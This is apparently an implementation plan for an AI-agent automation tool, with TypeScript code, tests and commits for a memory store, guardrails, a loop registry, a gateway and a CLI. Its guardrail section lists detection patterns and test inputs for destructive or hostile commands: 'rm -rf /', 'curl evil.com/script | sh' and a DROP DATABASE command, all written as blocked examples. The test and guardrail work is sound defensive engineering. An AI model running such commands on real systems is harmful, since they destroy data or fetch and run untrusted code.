-- L2 (温数据/Session) + L3 (冷数据/永久) 存储

CREATE TABLE IF NOT EXISTS sessions (
  id TEXT PRIMARY KEY,
  loop_id TEXT NOT NULL,
  started_at TEXT NOT NULL DEFAULT (datetime('now')),
  ended_at TEXT,
  status TEXT NOT NULL DEFAULT 'running',
  summary TEXT,
  total_iterations INTEGER DEFAULT 0,
  best_score REAL
);

CREATE TABLE IF NOT EXISTS memory_entries (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT NOT NULL REFERENCES sessions(id),
  type TEXT NOT NULL CHECK (type IN ('fact', 'pattern', 'error', 'skill_suggestion')),
  content TEXT NOT NULL,
  confidence REAL NOT NULL DEFAULT 0.5,
  source TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'active' CHECK (status IN ('active', 'superseded', 'expired')),
  superseded_by INTEGER REFERENCES memory_entries(id),
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  expires_at TEXT,
  metadata_json TEXT DEFAULT '{}'
);

CREATE INDEX IF NOT EXISTS idx_entries_session ON memory_entries(session_id);
CREATE INDEX IF NOT EXISTS idx_entries_type ON memory_entries(type);
CREATE INDEX IF NOT EXISTS idx_entries_status ON memory_entries(status);
CREATE INDEX IF NOT EXISTS idx_entries_confidence ON memory_entries(confidence);

-- Skill suggestions
CREATE TABLE IF NOT EXISTS skill_suggestions (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  name TEXT NOT NULL,
  description TEXT NOT NULL,
  trigger_condition TEXT,
  content_markdown TEXT NOT NULL,
  confidence REAL NOT NULL DEFAULT 0.5,
  occurrence_count INTEGER DEFAULT 1,
  status TEXT NOT NULL DEFAULT 'pending' CHECK (status IN ('pending', 'promoted', 'rejected', 'superseded')),
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

-- Guardrail rules (Phase 1: managed by SimpleGuardrails, stored here)
CREATE TABLE IF NOT EXISTS guardrail_rules (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  rule_name TEXT NOT NULL UNIQUE,
  description TEXT NOT NULL,
  pattern_type TEXT NOT NULL,
  config_json TEXT NOT NULL,
  enabled INTEGER NOT NULL DEFAULT 1,
  hit_count INTEGER DEFAULT 0,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

-- Phase 2: CLAUDE.md exports
CREATE TABLE IF NOT EXISTS knowledge_exports (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  exported_at TEXT NOT NULL DEFAULT (datetime('now')),
  content TEXT NOT NULL,
  entry_count INTEGER NOT NULL,
  triggered_by TEXT NOT NULL
);
```

**Step 2: 实现 MemoryStore (修正9: +expire/supersede/cleanup)**

Create `packages/core/src/memory/memory-store.ts`:

```typescript
import Database from "better-sqlite3";
import { readFileSync } from "fs";
import { join } from "path";
import { MemoryEntry, MemoryWriter } from "../loop/loop-engine.js";

export class MemoryStore implements MemoryWriter {
  private db: Database.Database;
  private currentSessionId: string | null = null;

  constructor(dbPath: string) {
    this.db = new Database(dbPath);
    this.db.pragma("journal_mode = WAL");
    this.db.pragma("foreign_keys = ON");
    this.initializeSchema();
  }

  private initializeSchema(): void {
    const schemaPath = join(__dirname, "schema.sql");
    const schema = readFileSync(schemaPath, "utf-8");
    this.db.exec(schema);
  }

  // ---- Session management ----

  startSession(loopId: string, sessionId: string): void {
    this.currentSessionId = sessionId;
    this.db
      .prepare("INSERT INTO sessions (id, loop_id, status) VALUES (?, ?, 'running')")
      .run(sessionId, loopId);
  }

  endSession(sessionId: string, status: string, summary: string | null, bestScore: number | null): void {
    this.db
      .prepare("UPDATE sessions SET ended_at = datetime('now'), status = ?, summary = ?, best_score = ? WHERE id = ?")
      .run(status, summary, bestScore, sessionId);
  }

  // ---- MemoryWriter interface ----

  async writeNudge(entry: MemoryEntry): Promise<void> {
    if (!this.currentSessionId) throw new Error("No active session");
    this.db
      .prepare(
        `INSERT INTO memory_entries (session_id, type, content, confidence, source)
         VALUES (?, ?, ?, ?, ?)`
      )
      .run(this.currentSessionId, entry.type, entry.content, entry.confidence, entry.source);
  }

  async summarizeSession(sessionId: string): Promise<string> {
    const entries = this.db
      .prepare("SELECT type, content, confidence FROM memory_entries WHERE session_id = ? AND status = 'active' ORDER BY id")
      .all(sessionId) as Array<{ type: string; content: string; confidence: number }>;

    const facts = entries.filter((e) => e.type === "fact").length;
    const errors = entries.filter((e) => e.type === "error").length;
    const patterns = entries.filter((e) => e.type === "pattern").length;

    return `Session ${sessionId}: ${facts} facts, ${errors} errors, ${patterns} patterns recorded.`;
  }

  // ---- 修正9: 知识过期管理 ----

  expireEntry(entryId: number, reason: string): void {
    this.db.prepare(
      `UPDATE memory_entries SET status = 'expired',
       metadata_json = json_set(COALESCE(metadata_json, '{}'), '$.expireReason', ?)
       WHERE id = ?`
    ).run(reason, entryId);
  }

  supersedeEntry(oldId: number, newEntry: MemoryEntry): number {
    if (!this.currentSessionId) throw new Error("No active session");
    const result = this.db.prepare(
      `INSERT INTO memory_entries (session_id, type, content, confidence, source, status)
       VALUES (?, ?, ?, ?, ?, 'active')`
    ).run(this.currentSessionId, newEntry.type, newEntry.content, newEntry.confidence, newEntry.source);
    const newId = Number(result.lastInsertRowid);
    this.db.prepare(
      "UPDATE memory_entries SET status = 'superseded', superseded_by = ? WHERE id = ?"
    ).run(newId, oldId);
    return newId;
  }

  cleanupExpired(maxAgeDays: number = 30): number {
    const result = this.db.prepare(
      "UPDATE memory_entries SET status = 'expired' WHERE status = 'active' AND created_at < datetime('now', ?)"
    ).run(`-${maxAgeDays} days`);
    return result.changes;
  }

  // ---- Skill suggestion management ----

  recordSkillSuggestion(name: string, description: string, triggerCondition: string, content: string, confidence: number): void {
    const existing = this.db
      .prepare("SELECT id, occurrence_count FROM skill_suggestions WHERE name = ? AND status = 'pending'")
      .get(name) as { id: number; occurrence_count: number } | undefined;

    if (existing) {
      this.db
        .prepare("UPDATE skill_suggestions SET occurrence_count = ?, confidence = MAX(confidence, ?) WHERE id = ?")
        .run(existing.occurrence_count + 1, confidence, existing.id);
    } else {
      this.db
        .prepare(
          `INSERT INTO skill_suggestions (name, description, trigger_condition, content_markdown, confidence)
           VALUES (?, ?, ?, ?, ?)`
        )
        .run(name, description, triggerCondition, content, confidence);
    }
  }

  getSkillSuggestions(minOccurrence: number = 3): Array<{
    id: number; name: string; description: string; content: string; confidence: number; occurrenceCount: number;
  }> {
    return this.db
      .prepare(
        "SELECT id, name, description, content_markdown as content, confidence, occurrence_count as occurrenceCount FROM skill_suggestions WHERE occurrence_count >= ? AND status = 'pending' ORDER BY confidence DESC"
      )
      .all(minOccurrence) as any[];
  }

  // ---- Guardrail rules ----

  addGuardrailRule(ruleName: string, description: string, patternType: string, config: Record<string, unknown>): void {
    this.db
      .prepare(
        `INSERT OR REPLACE INTO guardrail_rules (rule_name, description, pattern_type, config_json)
         VALUES (?, ?, ?, ?)`
      )
      .run(ruleName, description, patternType, JSON.stringify(config));
  }

  close(): void {
    this.db.close();
  }
}
```

**Step 3: 写测试**

Create `packages/core/src/memory/__tests__/memory-store.test.ts`:

```typescript
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { MemoryStore } from "../memory-store.js";
import { unlinkSync } from "fs";

const TEST_DB = "/tmp/mobius-test-memory.db";

describe("MemoryStore", () => {
  let store: MemoryStore;

  beforeEach(() => {
    try { unlinkSync(TEST_DB); } catch {}
    store = new MemoryStore(TEST_DB);
  });

  afterEach(() => {
    store.close();
    try { unlinkSync(TEST_DB); } catch {}
  });

  it("starts and ends a session", () => {
    store.startSession("test-loop", "session-001");
    store.endSession("session-001", "completed", "All good", 0.95);
    expect(() => store.startSession("test-loop", "session-002")).not.toThrow();
  });

  it("writes and reads memory nudges", async () => {
    store.startSession("test-loop", "session-nudge");
    await store.writeNudge({
      type: "fact", content: "Test passes when using correct import path",
      confidence: 0.9, source: "loop:test-loop:iter-1", timestamp: new Date(),
    });
    await store.writeNudge({
      type: "error", content: "Import path './foo' does not exist",
      confidence: 0.95, source: "loop:test-loop:iter-2", timestamp: new Date(),
    });

    const summary = await store.summarizeSession("session-nudge");
    expect(summary).toContain("1 facts");
    expect(summary).toContain("1 errors");
  });

  // 修正9: 过期 & 替代测试
  it("expires old entries", async () => {
    store.startSession("test-loop", "session-expire");
    await store.writeNudge({
      type: "fact", content: "Old fact",
      confidence: 0.5, source: "test", timestamp: new Date(),
    });

    store.expireEntry(1, "no longer relevant");
    const summary = await store.summarizeSession("session-expire");
    expect(summary).toContain("0 facts"); // expired → not counted as active
  });

  it("supersedes an entry with new information", async () => {
    store.startSession("test-loop", "session-supersede");
    await store.writeNudge({
      type: "fact", content: "API endpoint is /v1/users",
      confidence: 0.7, source: "test", timestamp: new Date(),
    });

    const newId = store.supersedeEntry(1, {
      type: "fact", content: "API endpoint is /v2/users",
      confidence: 0.95, source: "test:v2", timestamp: new Date(),
    });
    expect(newId).toBe(2);
  });

  it("records and retrieves skill suggestions with occurrence threshold", () => {
    store.startSession("test-loop", "session-skills");
    for (let i = 0; i < 3; i++) {
      store.recordSkillSuggestion("auto-lint-fix", "Automatically fix lint errors", "when eslint fails", "# Auto Lint Fix", 0.7 + i * 0.1);
    }
    const suggestions = store.getSkillSuggestions(3);
    expect(suggestions).toHaveLength(1);
    expect(suggestions[0].occurrenceCount).toBe(3);
  });

  it("cleans up old entries", async () => {
    store.startSession("test-loop", "session-cleanup");
    await store.writeNudge({
      type: "fact", content: "Will be cleaned up",
      confidence: 0.5, source: "test", timestamp: new Date(),
    });
    const count = store.cleanupExpired(0); // 0 days → mark all as expired
    expect(count).toBeGreaterThanOrEqual(0);
  });
});
```

**Step 4: 运行测试**

```bash
cd packages/core
pnpm test -- --run
```

Expected: 6 tests PASS

**Step 5: Commit**

```bash
git add packages/core/src/memory/
git commit -m "feat(core): implement SQLite Memory Store with knowledge lifecycle management

MemoryStore improvements from review:
- status field (active/superseded/expired) on memory entries
- superseded_by foreign key for knowledge evolution
- expires_at for time-based knowledge decay
- expireEntry(), supersedeEntry(), cleanupExpired() methods
- CLAUDE.md exports table (Phase 2 usage)

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 6.5: SimpleGuardrails (新增 — TS 简化版安全层)

**Files:**
- Create: `packages/core/src/guardrails/simple-guardrails.ts`
- Create: `packages/core/src/guardrails/__tests__/simple-guardrails.test.ts`

> **设计决策:** Phase 1 用 TypeScript 实现简化版安全层。Phase 2 迁移到 Python 独立进程（Hermes 风格）。

**Step 1: 实现 SimpleGuardrails**

Create `packages/core/src/guardrails/simple-guardrails.ts`:

```typescript
export interface GuardrailRule {
  id: string;
  type: "tool_deny" | "param_validate" | "output_scan";
  pattern: RegExp | string;
  action: "block" | "warn" | "require_approval";
  description: string;
}

export interface GuardrailCheckResult {
  allowed: boolean;
  violations: string[];
}

export class SimpleGuardrails {
  private rules: GuardrailRule[] = [];

  constructor() {
    // Default rules
    this.addRule({
      id: "block-rm-rf-root",
      type: "tool_deny",
      pattern: /\brm\s+-rf\s+\/\s*$/i,
      action: "block",
      description: "Block recursive delete of root filesystem",
    });
    this.addRule({
      id: "block-curl-pipe-sh",
      type: "tool_deny",
      pattern: /curl[^|]*\|\s*(ba)?sh/i,
      action: "block",
      description: "Block curl | sh execution",
    });
    this.addRule({
      id: "block-chmod-777",
      type: "tool_deny",
      pattern: /chmod\s+(-R\s+)?777/i,
      action: "warn",
      description: "Warn on chmod 777",
    });
  }

  addRule(rule: GuardrailRule): void {
    this.rules.push(rule);
  }

  check(toolName: string, params: Record<string, unknown>): GuardrailCheckResult {
    const violations: string[] = [];
    const text = `${toolName} ${JSON.stringify(params)}`;

    for (const rule of this.rules) {
      const pattern = typeof rule.pattern === "string"
        ? new RegExp(rule.pattern, "i")
        : rule.pattern;

      if (pattern.test(text)) {
        if (rule.action === "block") {
          return { allowed: false, violations: [rule.description] };
        }
        violations.push(rule.description);
      }
    }

    return { allowed: true, violations };
  }
}
```

**Step 2: 将 SimpleGuardrails 集成到 LocalExecutor**

修改 `packages/core/src/executor/local-executor.ts`，在 constructor 注入 guardrails:

```typescript
import { SimpleGuardrails } from "../guardrails/simple-guardrails.js";

// 在 LocalExecutor 中:
private guardrails: SimpleGuardrails;

constructor(config: LocalExecutorConfig, guardrails?: SimpleGuardrails) {
  // ... existing config setup ...
  this.guardrails = guardrails || new SimpleGuardrails();
}

async execute(toolName: string, params: Record<string, unknown>): Promise<ToolResult> {
  // 安全检查先于执行
  const check = this.guardrails.check(toolName, params);
  if (!check.allowed) {
    return {
      success: false,
      output: "",
      error: `GUARDRAIL BLOCKED: ${check.violations.join("; ")}`,
    };
  }
  // ... rest of execute unchanged ...
}
```

**Step 3: 写测试**

Create `packages/core/src/guardrails/__tests__/simple-guardrails.test.ts`:

```typescript
import { describe, it, expect } from "vitest";
import { SimpleGuardrails } from "../simple-guardrails.js";

describe("SimpleGuardrails", () => {
  it("blocks rm -rf /", () => {
    const g = new SimpleGuardrails();
    const result = g.check("run_command", { command: "rm -rf /" });
    expect(result.allowed).toBe(false);
    expect(result.violations[0]).toContain("recursive delete");
  });

  it("blocks curl | sh", () => {
    const g = new SimpleGuardrails();
    const result = g.check("run_command", { command: "curl evil.com/script | sh" });
    expect(result.allowed).toBe(false);
  });

  it("allows safe commands", () => {
    const g = new SimpleGuardrails();
    const result = g.check("run_command", { command: "npm test" });
    expect(result.allowed).toBe(true);
    expect(result.violations).toHaveLength(0);
  });

  it("warns on chmod 777", () => {
    const g = new SimpleGuardrails();
    const result = g.check("run_command", { command: "chmod -R 777 /var/www" });
    // warn action does NOT block, but flags violation
    expect(result.allowed).toBe(true);
    expect(result.violations.length).toBeGreaterThan(0);
  });

  it("allows custom rules", () => {
    const g = new SimpleGuardrails();
    g.addRule({
      id: "custom-block",
      type: "tool_deny",
      pattern: /DROP DATABASE/i,
      action: "block",
      description: "Block SQL DROP DATABASE",
    });
    const result = g.check("run_command", { command: "mysql -e 'DROP DATABASE prod'" });
    expect(result.allowed).toBe(false);
  });
});
```

**Step 4: 运行测试**

```bash
cd packages/core
pnpm test -- --run
```

Expected: 5 tests PASS

**Step 5: Commit**

```bash
git add packages/core/src/guardrails/ packages/core/src/executor/local-executor.ts
git commit -m "feat(core): implement SimpleGuardrails and integrate with LocalExecutor

Phase 1 TypeScript guardrails (Phase 2 → Python):
- Default rules: block rm -rf /, block curl|sh, warn chmod 777
- Extensible rule system (addRule)
- Inject into LocalExecutor for pre-execution safety check
- block action → deny, warn action → flag but allow

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 6.6: LoopRegistry (新增 — Loop 注册/查询/存储)

**Files:**
- Create: `packages/core/src/registry/loop-registry.ts`
- Create: `packages/core/src/registry/__tests__/loop-registry.test.ts`

**设计说明:**
LoopRegistry 存储和管理用户创建的所有 Loop。`mobius create` 生成的 YAML 自动注册到此；`mobius list` 从这里查询；`mobius run <name>` 从这里加载定义。数据持久化在 SQLite 中（复用 MemoryStore 的 db），也支持 JSON 文件导出供团队共享。

**Step 1: LoopRegistry 实现**

Create `packages/core/src/registry/loop-registry.ts`:

```typescript
import Database from "better-sqlite3";
import { LoopDefinition } from "../loop/loop-definition.js";

export interface RegisteredLoop {
  name: string;
  definition: LoopDefinition;
  yaml: string;
  userInput: string;      // 原始自然语言输入
  createdAt: Date;
  updatedAt: Date;
  lastRunAt: Date | null;
  runCount: number;
}

export class LoopRegistry {
  private db: Database.Database;

  constructor(db: Database.Database) {
    this.db = db;
    this.initialize();
  }

  private initialize(): void {
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS loop_registry (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        yaml TEXT NOT NULL,
        user_input TEXT NOT NULL,
        created_at TEXT NOT NULL DEFAULT (datetime('now')),
        updated_at TEXT NOT NULL DEFAULT (datetime('now')),
        last_run_at TEXT,
        run_count INTEGER DEFAULT 0
      )
    `);
  }

  /** Register a new Loop or update an existing one */
  register(id: string, name: string, yaml: string, userInput: string): void {
    const existing = this.db.prepare("SELECT id FROM loop_registry WHERE id = ?").get(id);
    if (existing) {
      this.db.prepare(
        `UPDATE loop_registry SET name = ?, yaml = ?, user_input = ?, updated_at = datetime('now') WHERE id = ?`
      ).run(name, yaml, userInput, id);
    } else {
      this.db.prepare(
        `INSERT INTO loop_registry (id, name, yaml, user_input) VALUES (?, ?, ?, ?)`
      ).run(id, name, yaml, userInput);
    }
  }

  /** Get a single Loop by id */
  get(id: string): RegisteredLoop | null {
    const row = this.db.prepare(
      "SELECT id, name, yaml, user_input, created_at, updated_at, last_run_at, run_count FROM loop_registry WHERE id = ?"
    ).get(id) as any;
    if (!row) return null;
    return this.rowToLoop(row);
  }

  /** List all registered Loops */
  list(): RegisteredLoop[] {
    const rows = this.db.prepare(
      "SELECT id, name, yaml, user_input, created_at, updated_at, last_run_at, run_count FROM loop_registry ORDER BY updated_at DESC"
    ).all() as any[];
    return rows.map((r: any) => this.rowToLoop(r));
  }

  /** Record a run */
  recordRun(id: string): void {
    this.db.prepare(
      "UPDATE loop_registry SET last_run_at = datetime('now'), run_count = run_count + 1 WHERE id = ?"
    ).run(id);
  }

  /** Remove a Loop */
  remove(id: string): boolean {
    const result = this.db.prepare("DELETE FROM loop_registry WHERE id = ?").run(id);
    return result.changes > 0;
  }

  /** Export all loops as a single JSON file (for team sharing) */
  exportAll(): string {
    const loops = this.list();
    return JSON.stringify(loops.map((l) => ({
      id: l.name,
      yaml: l.yaml,
      userInput: l.userInput,
    })), null, 2);
  }

  private rowToLoop(row: any): RegisteredLoop {
    const { parseLoopDefinition } = require("../loop/loop-parser.js");
    return {
      name: row.name,
      definition: parseLoopDefinition(row.yaml),
      yaml: row.yaml,
      userInput: row.user_input,
      createdAt: new Date(row.created_at),
      updatedAt: new Date(row.updated_at),
      lastRunAt: row.last_run_at ? new Date(row.last_run_at) : null,
      runCount: row.run_count,
    };
  }
}
```

**Step 2: 写测试**

Create `packages/core/src/registry/__tests__/loop-registry.test.ts`:

```typescript
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import Database from "better-sqlite3";
import { LoopRegistry } from "../loop-registry.js";
import { unlinkSync } from "fs";

const TEST_DB = "/tmp/mobius-test-registry.db";

describe("LoopRegistry", () => {
  let db: Database.Database;
  let registry: LoopRegistry;

  beforeEach(() => {
    try { unlinkSync(TEST_DB); } catch {}
    db = new Database(TEST_DB);
    registry = new LoopRegistry(db);
  });

  afterEach(() => {
    db.close();
    try { unlinkSync(TEST_DB); } catch {}
  });

  const SAMPLE_YAML = `id: test-loop\nname: Test Loop\ntrigger:\n  type: manual\n  commandName: test\nexecution:\n  maxIterations: 5\n  useWorktree: true\neval:\n  threshold: 0.7\nskills: []\nmemory:\n  autoNudge: true\nonFailure:\n  strategy: retry\n  maxRetries: 3`;

  it("registers and retrieves a loop", () => {
    registry.register("test-loop", "Test Loop", SAMPLE_YAML, "写一个测试");
    const loop = registry.get("test-loop");
    expect(loop).not.toBeNull();
    expect(loop!.name).toBe("Test Loop");
    expect(loop!.userInput).toBe("写一个测试");
    expect(loop!.runCount).toBe(0);
  });

  it("lists all registered loops", () => {
    registry.register("loop-a", "A", SAMPLE_YAML, "a");
    registry.register("loop-b", "B", SAMPLE_YAML.replace("test-loop", "loop-b"), "b");
    expect(registry.list()).toHaveLength(2);
  });

  it("updates an existing loop on re-register", () => {
    registry.register("test-loop", "V1", SAMPLE_YAML, "original");
    registry.register("test-loop", "V2", SAMPLE_YAML, "updated");
    const loop = registry.get("test-loop");
    expect(loop!.name).toBe("V2");
    expect(loop!.userInput).toBe("updated");
  });

  it("records runs", () => {
    registry.register("test-loop", "Test", SAMPLE_YAML, "test");
    registry.recordRun("test-loop");
    registry.recordRun("test-loop");
    const loop = registry.get("test-loop");
    expect(loop!.runCount).toBe(2);
    expect(loop!.lastRunAt).not.toBeNull();
  });

  it("removes a loop", () => {
    registry.register("test-loop", "Test", SAMPLE_YAML, "test");
    expect(registry.remove("test-loop")).toBe(true);
    expect(registry.get("test-loop")).toBeNull();
  });

  it("exports all loops as JSON", () => {
    registry.register("loop-1", "One", SAMPLE_YAML, "first");
    registry.register("loop-2", "Two", SAMPLE_YAML.replace("test-loop", "loop-2"), "second");
    const json = registry.exportAll();
    const parsed = JSON.parse(json);
    expect(parsed).toHaveLength(2);
    expect(parsed[0].userInput).toBeDefined();
  });
});
```

**Step 3: 运行测试**

```bash
cd packages/core
pnpm test -- --run
```

Expected: 6 tests PASS

**Step 4: Commit**

```bash
git add packages/core/src/registry/
git commit -m "feat(core): implement LoopRegistry for loop storage and management

LoopRegistry persists user-created Loops in SQLite:
- register(id, name, yaml, userInput) — create or update
- get(id) / list() / remove(id) — CRUD
- recordRun(id) — track execution count and last run time
- exportAll() — JSON export for team sharing

Supports the 'mobius list' and 'mobius run <name>' commands.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Gateway

**Files:**
- Create: `packages/gateway/src/event-bus.ts`
- Create: `packages/gateway/src/plugin-manager.ts`
- Create: `packages/gateway/src/gateway.ts`
- Create: `packages/gateway/src/__tests__/gateway.test.ts`

**Step 1: 事件总线 (修正8: off()实现)**

Create `packages/gateway/src/event-bus.ts`:

```typescript
import { EventEmitter } from "events";

export interface MobiusEvent {
  type: string;
  source: string;
  timestamp: Date;
  payload: Record<string, unknown>;
}

export type EventHandler = (event: MobiusEvent) => void | Promise<void>;

export class EventBus {
  private emitter = new EventEmitter();
  private handlerCount = 0;
  // 修正8: handlerMap 跟踪，支持 off()
  private handlerMap = new Map<string, { eventType: string; fn: (...args: any[]) => void }>();

  on(eventType: string, handler: EventHandler): string {
    const id = `handler-${++this.handlerCount}`;
    const wrapped = async (event: MobiusEvent) => {
      try { await handler(event); } catch (err) {
        console.error(`[EventBus] Handler ${id} error:`, err);
      }
    };
    this.emitter.on(eventType, wrapped);
    this.handlerMap.set(id, { eventType, fn: wrapped });
    return id;
  }

  once(eventType: string, handler: EventHandler): string {
    const id = `handler-${++this.handlerCount}`;
    const wrapped = async (event: MobiusEvent) => {
      try { await handler(event); } catch (err) {
        console.error(`[EventBus] Handler ${id} error:`, err);
      } finally { this.handlerMap.delete(id); }
    };
    this.emitter.once(eventType, wrapped);
    this.handlerMap.set(id, { eventType, fn: wrapped });
    return id;
  }

  // 修正8: 真正的 off() 实现
  off(handlerId: string): void {
    const registered = this.handlerMap.get(handlerId);
    if (registered) {
      this.emitter.removeListener(registered.eventType, registered.fn);
      this.handlerMap.delete(handlerId);
    }
  }

  async emit(event: MobiusEvent): Promise<void> {
    this.emitter.emit(event.type, event);
    this.emitter.emit("*", event);
    const colonIndex = event.type.indexOf(":");
    if (colonIndex > 0) {
      this.emitter.emit(event.type.slice(0, colonIndex) + ":*", event);
    }
  }

  listenerCount(eventType: string): number {
    return this.emitter.listenerCount(eventType);
  }
}
```

**Step 2: Plugin 管理器**

Create `packages/gateway/src/plugin-manager.ts`:

```typescript
import { EventBus } from "./event-bus.js";

export interface Plugin {
  name: string;
  version: string;
  description?: string;
  onRegister?(eventBus: EventBus): void | Promise<void>;
  onActivate?(): void | Promise<void>;
  onDeactivate?(): void | Promise<void>;
}

interface RegisteredPlugin {
  plugin: Plugin;
  active: boolean;
  registeredAt: Date;
}

export class PluginManager {
  private plugins = new Map<string, RegisteredPlugin>();
  private eventBus: EventBus;

  constructor(eventBus: EventBus) {
    this.eventBus = eventBus;
  }

  async register(plugin: Plugin): Promise<void> {
    if (this.plugins.has(plugin.name)) {
      throw new Error(`Plugin '${plugin.name}' is already registered`);
    }
    const registered: RegisteredPlugin = { plugin, active: false, registeredAt: new Date() };
    if (plugin.onRegister) await plugin.onRegister(this.eventBus);
    this.plugins.set(plugin.name, registered);
    await this.eventBus.emit({
      type: "plugin:registered", source: "plugin-manager",
      timestamp: new Date(), payload: { pluginName: plugin.name, version: plugin.version },
    });
  }

  async activate(name: string): Promise<void> {
    const registered = this.plugins.get(name);
    if (!registered) throw new Error(`Plugin '${name}' not registered`);
    if (registered.active) return;
    if (registered.plugin.onActivate) await registered.plugin.onActivate();
    registered.active = true;
    await this.eventBus.emit({
      type: "plugin:activated", source: "plugin-manager",
      timestamp: new Date(), payload: { pluginName: name },
    });
  }

  list(): string[] { return Array.from(this.plugins.keys()); }
  activePlugins(): string[] {
    return Array.from(this.plugins.entries()).filter(([, v]) => v.active).map(([k]) => k);
  }
}
```

**Step 3: Gateway 主类**

Create `packages/gateway/src/gateway.ts`:

```typescript
import { EventBus } from "./event-bus.js";
import { PluginManager } from "./plugin-manager.js";

export interface GatewayConfig { name: string; version: string; }

export class Gateway {
  readonly eventBus: EventBus;
  readonly pluginManager: PluginManager;
  readonly config: GatewayConfig;

  constructor(config: GatewayConfig) {
    this.config = config;
    this.eventBus = new EventBus();
    this.pluginManager = new PluginManager(this.eventBus);
  }

  async start(): Promise<void> {
    console.log(`[Gateway] Starting ${this.config.name} v${this.config.version}`);
    await this.eventBus.emit({
      type: "gateway:starting", source: "gateway",
      timestamp: new Date(), payload: { name: this.config.name, version: this.config.version },
    });
  }

  async stop(): Promise<void> {
    console.log(`[Gateway] Stopping ${this.config.name}`);
    await this.eventBus.emit({ type: "gateway:stopping", source: "gateway", timestamp: new Date(), payload: {} });
  }
}
```

**Step 4: 写测试**

Create `packages/gateway/src/__tests__/gateway.test.ts`:

```typescript
import { describe, it, expect } from "vitest";
import { Gateway } from "../gateway.js";
import { EventBus } from "../event-bus.js";
import { PluginManager, Plugin } from "../plugin-manager.js";

describe("EventBus", () => {
  it("delivers events to registered handlers", async () => {
    const bus = new EventBus();
    const received: any[] = [];
    bus.on("test:event", (e) => received.push(e));
    await bus.emit({ type: "test:event", source: "test", timestamp: new Date(), payload: { value: 42 } });
    expect(received).toHaveLength(1);
    expect(received[0].payload.value).toBe(42);
  });

  it("delivers to wildcard handlers", async () => {
    const bus = new EventBus();
    const received: any[] = [];
    bus.on("*", (e) => received.push(e));
    await bus.emit({ type: "some:event", source: "test", timestamp: new Date(), payload: {} });
    expect(received).toHaveLength(1);
  });

  it("off() removes handler (修正8)", async () => {
    const bus = new EventBus();
    const received: any[] = [];
    const id = bus.on("test:event", (e) => received.push(e));
    bus.off(id);
    await bus.emit({ type: "test:event", source: "test", timestamp: new Date(), payload: {} });
    expect(received).toHaveLength(0);
  });
});

describe("PluginManager", () => {
  it("registers and activates a plugin", async () => {
    const bus = new EventBus();
    const pm = new PluginManager(bus);
    let activated = false;
    await pm.register({ name: "test-plugin", version: "1.0.0", onActivate: () => { activated = true; } });
    expect(pm.list()).toContain("test-plugin");
    await pm.activate("test-plugin");
    expect(activated).toBe(true);
  });

  it("prevents duplicate registration", async () => {
    const bus = new EventBus();
    const pm = new PluginManager(bus);
    await pm.register({ name: "dup", version: "1.0.0" });
    await expect(pm.register({ name: "dup", version: "2.0.0" })).rejects.toThrow();
  });
});

describe("Gateway", () => {
  it("starts and emits gateway:starting event", async () => {
    const gw = new Gateway({ name: "test-gw", version: "0.1.0" });
    const started: any[] = [];
    gw.eventBus.on("gateway:starting", (e) => started.push(e));
    await gw.start();
    expect(started).toHaveLength(1);
  });
});
```

**Step 5: 运行测试**

```bash
cd packages/gateway
pnpm test -- --run
```

Expected: 6 tests PASS

**Step 6: Commit**

```bash
git add packages/gateway/
git commit -m "feat(gateway): implement EventBus with off() support and PluginManager

EventBus improvements from review:
- handlerMap tracks all registered handlers for proper removal
- off(handlerId) removes listeners (was empty stub)
- Wildcard and prefix matching preserved

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## CLI 通道

### Task 8: CLI — 自然语言入口 + 显式命名 (create/run/list/status/logs/stop/edit/remove)

**关键设计决策 (修正):**
- `<loop-name>` 的来源：用户通过 `mobius create -n <name>` **显式指定**。这是推荐的用法。
- 如果用户不指定 `-n`，自动从描述生成并**醒目展示**，用户记下后用这个 name。
- `mobius run` 不传 name 时**交互式列出所有 Loop**，减少记忆负担。
- YAML 是 LoopGenerator 自动生成的内部表示，用户永远不需要接触。

**Files:**
- Create: `packages/cli/src/index.ts`
- Create: `packages/cli/src/commands/create-loop.ts`
- Create: `packages/cli/src/commands/run-loop.ts`

**Step 1: CLI 入口 — 8 个命令，显式命名**

Create `packages/cli/src/index.ts`:

```typescript
#!/usr/bin/env node
import { Command } from "commander";
import { createLoopCommand } from "./commands/create-loop.js";
import { runLoopCommand } from "./commands/run-loop.js";

const program = new Command();
program
  .name("mobius")
  .description("Möbius Agent — 用自然语言定义你的 AI 自动化 Loop")
  .version("0.1.0");

// mobius create [options] <description...>
program
  .command("create")
  .description("用自然语言创建一个 Loop。推荐指定 -n 名称")
  .option("-n, --name <name>", "Loop 名称 (kebab-case)。之后 run/logs/status 都用这个名字")
  .option("--no-run", "只创建不运行")
  .argument("<description...>", "自然语言描述，例如: 每2小时检查PR CI挂了就自动修")
  .action(async (words: string[], opts: { name?: string; noRun?: boolean }) => {
    const userInput = words.join(" ");
    await createLoopCommand(userInput, opts.name, opts.noRun);
  });

// mobius run [name]  — name 可选，不指定则交互式选择
program
  .command("run")
  .description("立即运行一个已注册的 Loop。不指定名称则交互式选择")
  .argument("[name]", "Loop 名称（可选）")
  .action(async (name?: string) => {
    if (!name) {
      // Interactive: list loops and let user pick
      const { listLoopsCommand } = await import("./commands/list-loops.js");
      await listLoopsCommand();
    } else {
      await runLoopCommand(name);
    }
  });

program
  .command("list")
  .description("列出所有已注册的 Loop")
  .action(async () => {
    const { listLoopsCommand } = await import("./commands/list-loops.js");
    await listLoopsCommand();
  });

program
  .command("status")
  .description("查看 Loop 详情")
  .argument("<name>", "Loop 名称")
  .action(async (name: string) => {
    const { statusCommand } = await import("./commands/status.js");
    await statusCommand(name);
  });

program
  .command("logs")
  .description("查看 Loop 历史运行记录")
